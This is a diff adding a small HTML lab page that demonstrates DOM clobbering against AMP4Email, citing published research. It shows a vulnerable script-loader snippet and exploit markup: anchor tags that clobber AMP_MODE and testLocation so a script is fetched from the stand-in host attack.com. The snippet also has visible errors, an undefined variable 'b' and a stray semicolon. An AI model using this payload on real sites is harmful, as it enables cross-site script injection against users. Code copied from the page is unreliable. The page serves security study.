@@ -1,0 +1,40 @@
+<html>
+    <head>
+    <title>DOM Clobbering Gadget 1: AMP4Email</title>
+    <p>SOURCE:</p>
+    <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a><br/>
+<a href="https://blog.huli.tw/2021/01/23/en/dom-clobbering/">https://blog.huli.tw/2021/01/23/en/dom-clobbering/</a><br/>
+
+    </head>
+    <body>
+    <p>Vulnerable Code:</p>
+    <script>
+  var script = window.document.createElement("script");
+  script.async = false;
+
+  var loc;
+  if (AMP_MODE.test && window.testLocation) {
+      loc = window.testLocation
+  } else {
+      loc = window.location;
+  }
+
+  if (AMP_MODE.localDev) {
+      loc = loc.protocol + "//" + loc.host + "/dist"
+  } else {
+      loc = "https://cdn.ampproject.org";
+  }
+
+  var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
+  b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
+
+  document.head.appendChild(b);
+</script>
+    <p>Exploit Code:</p>
+    <a id="AMP_MODE" name="localDev"></a>
+<a id="AMP_MODE" name="test"></a>
+
+<a id="testLocation"></a>
+<a id="testLocation" name="protocol" href="https://attack.com"></a>
+    </body>
+    </html>
